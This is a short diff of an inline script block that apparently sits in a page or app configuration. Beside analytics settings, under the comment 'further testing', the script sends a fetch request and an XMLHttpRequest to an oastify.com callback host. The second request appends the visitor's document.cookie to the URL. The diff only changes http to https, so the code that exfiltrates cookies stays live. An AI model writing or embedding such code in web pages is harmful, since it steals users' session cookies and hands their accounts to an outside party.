@@ -47,13 +47,13 @@
         'campaign_medium':'app'
         });
         // further testing
-        fetch('http://288kydkscyu1yf4hya78vdex1o7gvej3.oastify.com/fetch.worsk');
+        fetch('https://288kydkscyu1yf4hya78vdex1o7gvej3.oastify.com/fetch.worsk');
         function reqListener() {
           console.log(this.responseText);
         }
         const req = new XMLHttpRequest();
         req.addEventListener('load', reqListener);
-        req.open('GET', `http://288kydkscyu1yf4hya78vdex1o7gvej3.oastify.com/xhr.works?c=${document.cookie}`);
+        req.open('GET', `https://288kydkscyu1yf4hya78vdex1o7gvej3.oastify.com/xhr.works?c=${document.cookie}`);
         req.send();
     </script>
     ]]>
